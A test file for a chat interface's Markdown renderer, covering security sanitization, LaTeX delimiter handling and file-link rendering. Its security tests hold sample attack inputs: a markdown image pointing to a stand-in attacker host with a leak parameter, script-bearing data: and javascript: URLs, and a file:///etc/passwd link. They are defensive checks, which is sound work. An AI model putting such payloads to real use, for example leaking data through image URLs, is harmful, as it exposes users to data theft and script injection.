/**
 * Renders the REAL web chat markdown component (web/src/components/Markdown)
 * with react-dom/server and pins the security and math-normalization
 * guarantees of the chat renderer:
 *  - images never become fetching elements (no <img>, alt+host chip instead),
 *  - javascript:/data: URLs lose their href, web links are click-gated,
 *  - the \[…\]/\(…\) pre-transform never swallows prose around unpaired
 *    lookalike delimiters, skips indented code, keeps lists intact around
 *    display math, and suppresses a still-streaming display block,
 *  - project-file mentions (`main.tex:42`) linkify — inside inline code too —
 *    while unknown paths stay plain text.
 */
import { describe, expect, it } from "vitest";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown, { normalizeMathDelimiters, safeUrl } from "../../web/src/components/Markdown.js";

function render(text: string, extra: Record<string, unknown> = {}): string {
  return renderToStaticMarkup(React.createElement(Markdown, { text, ...extra }));
}

describe("chat markdown security (F1)", () => {
  it("never renders a fetching <img> for remote images — an inert chip instead", () => {
    const html = render("![x](https://attacker.example/leak?d=1)");
    expect(html).not.toContain("<img");
    // The URL never lands in a fetchable attribute (title on the chip is fine).
    expect(html).not.toContain("src=");
    expect(html).not.toContain('href="https://attacker');
    expect(html).toContain("md-img-chip");
    expect(html).toContain("attacker.example"); // the host is named on the chip
    expect(html).toContain("· x"); // the alt text is shown
  });

  it("neutralizes data:/javascript: image sources without emitting an element", () => {
    const html = render("![p](data:text/html,<script>alert(1)</script>)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("data:text/html");
    expect(html).toContain("md-img-chip");
  });

  it("drops the href of javascript:/data: links entirely", () => {
    for (const bad of ["javascript:alert(1)", "data:text/html,x", "vbscript:x", "file:///etc/passwd"]) {
      const html = render(`[boom](${bad})`);
      expect(html).toContain("boom");
      expect(html).not.toContain("href=");
    }
  });

  it("keeps web links click-gated with rel=noreferrer noopener", () => {
    const html = render("[site](https://example.com/a)");
    expect(html).toContain('href="https://example.com/a"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noreferrer noopener"');
  });

  it("safeUrl allows http(s)/mailto/relative only", () => {
    expect(safeUrl("https://a.b/c")).toBe("https://a.b/c");
    expect(safeUrl("http://a.b")).toBe("http://a.b");
    expect(safeUrl("mailto:x@y.z")).toBe("mailto:x@y.z");
    expect(safeUrl("relative/path.html")).toBe("relative/path.html");
    expect(safeUrl("#anchor")).toBe("#anchor");
    expect(safeUrl("javascript:alert(1)")).toBe("");
    expect(safeUrl("data:text/html,x")).toBe("");
    expect(safeUrl("vbscript:x")).toBe("");
    expect(safeUrl("irc://irc.example/chan")).toBe("");
    expect(safeUrl("xmpp:x@y")).toBe("");
    expect(safeUrl("JAVASCRIPT:alert(1)")).toBe("");
  });
});

describe("math delimiter normalization (F2–F5)", () => {
  it("F2: an unpaired \\[ lookalike never swallows prose up to a later \\]", () => {
    const input = "Use \\\\[4pt] for spacing. Later real math \\[x=1\\] appears.";
    // `\\[4pt]` stays byte-identical; only the genuine pair converts.
    expect(normalizeMathDelimiters(input)).toBe(
      "Use \\\\[4pt] for spacing. Later real math $$x=1$$ appears.",
    );
    const html = render(input);
    expect(html).toContain("[4pt] for spacing"); // prose survives
    expect(html).toContain("x=1"); // math renders
    expect(html).toContain("katex");
  });

  it("F2: a lone \\[ with no closer in reach stays untouched", () => {
    const input = "Use \\\\[4pt] after the matrix row.";
    expect(normalizeMathDelimiters(input)).toBe(input);
  });

  it("F2: \\(…\\) never matches across a blank line (cross-paragraph swallow)", () => {
    const input = "an open \\( paren here\n\nand a stray \\) later";
    expect(normalizeMathDelimiters(input)).toBe(input);
  });

  it("F2: real display math on its own line still becomes a display block", () => {
    const html = render("Before.\n\n\\[E=mc^2\\]\n\nAfter.");
    expect(html).toContain("katex-display");
    expect(html).toContain("E=mc^2");
  });

  it("F3: indented (4-space) code blocks keep their literal delimiters", () => {
    const html = render("para\n\n    code \\(x\\) here\n\nafter");
    expect(html).toContain("<pre>");
    expect(html).toContain("code \\(x\\) here");
    expect(html).not.toContain("$x$");
  });

  it("F3: an indented block at the very start of the message is code too", () => {
    const html = render("    \\(x\\) stays raw");
    expect(html).toContain("<pre>");
    expect(html).toContain("\\(x\\) stays raw");
  });

  it("F4: a standalone $$…$$ line inside a list item keeps ONE list and renders display math", () => {
    const html = render("- item text\n  $$x=1$$\n- next");
    expect(html.match(/<ul/g)?.length).toBe(1);
    expect(html).toContain("katex-display");
    expect(html).toContain("item text");
    expect(html).toContain("next");
  });

  it("F4: a top-level standalone $$…$$ line still renders as display math", () => {
    const html = render("The area:\n\n$$\\int_0^1 x\\,dx$$");
    expect(html).toContain("katex-display");
  });

  it("F5: an unterminated single-line display block renders as raw text, not an empty box", () => {
    const html = render("$$\\int_0^1 x");
    expect(html).not.toContain("katex-display");
    expect(html).toContain("$$");
    expect(html).toContain("\\int_0^1 x");
  });

  it("F5: a bare $$ line with nothing after renders as raw text", () => {
    const html = render("$$");
    expect(html).not.toContain("katex-display");
    expect(html).toContain("$$");
  });

  it("F5: an open multi-line display block shows its raw text until the closer arrives", () => {
    const streaming = render("The energy:\n\n$$\nE=mc^2");
    expect(streaming).not.toContain("katex-display");
    expect(streaming).toContain("E=mc^2");
    const settled = render("The energy:\n\n$$\nE=mc^2\n$$");
    expect(settled).toContain("katex-display");
  });

  it("F5: never touches $$ inside code fences", () => {
    const input = "```\n$$ not math\n```";
    expect(normalizeMathDelimiters(input)).toBe(input);
  });

  it("keeps the existing guarantees: currency, inline code, fenced literals", () => {
    expect(render("this costs $5 in total")).toContain("this costs $5 in total");
    const code = render("use `\\(x\\)` in LaTeX and \\(y\\) as math");
    expect(code).toContain("\\(x\\)"); // inline code stays raw
    expect(code).toContain("katex"); // the real math converted
    const fence = render("```\ncode keeps its literal $x$ and **markers**\n```");
    expect(fence).toContain("code keeps its literal $x$ and **markers**");
  });
});

describe("project file links (job B)", () => {
  const files = ["main.tex", "sections/intro.tex", "refs.bib"];
  const onOpenFile = () => {};

  it("linkifies existing files with and without :line — inside inline code too", () => {
    const html = render("See `main.tex:42`, sections/intro.tex and refs.bib:12.", {
      files,
      onOpenFile,
    });
    expect(html).toContain(">main.tex:42</a>");
    expect(html).toContain(">sections/intro.tex</a>");
    expect(html).toContain(">refs.bib:12</a>");
    expect(html.match(/md-file-link/g)?.length).toBe(3);
    // The code-span link keeps its code styling (anchor nested in <code>).
    expect(html).toMatch(/<code[^>]*><a[^>]*md-file-link/);
  });

  it("leaves non-existent paths as plain text", () => {
    const html = render("See nonexistent.tex:9 and main.tex:3.", { files, onOpenFile });
    expect(html).not.toMatch(/<a[^>]*>nonexistent\.tex/);
    expect(html).toContain("nonexistent.tex:9");
    expect(html).toContain(">main.tex:3</a>");
  });

  it("never linkifies without the project file list", () => {
    const html = render("See main.tex:3.");
    expect(html).not.toContain("md-file-link");
  });

  it("does not linkify inside block code", () => {
    const html = render("```\nmain.tex:3\n```", { files, onOpenFile });
    expect(html).not.toContain("md-file-link");
  });

  it("offers blockquote actions only when wired, and only find-in-PDF when a PDF pane is visible", () => {
    const none = render("> quoted passage");
    expect(none).not.toContain("find in source");
    const wired = render("> quoted passage", { onLocateQuote: async () => true });
    expect(wired).toContain("find in source");
    expect(wired).not.toContain("find in PDF");
    const withPdf = render("> quoted passage", {
      onLocateQuote: async () => true,
      onFindInPdf: () => {},
    });
    expect(withPdf).toContain("find in PDF");
  });
});
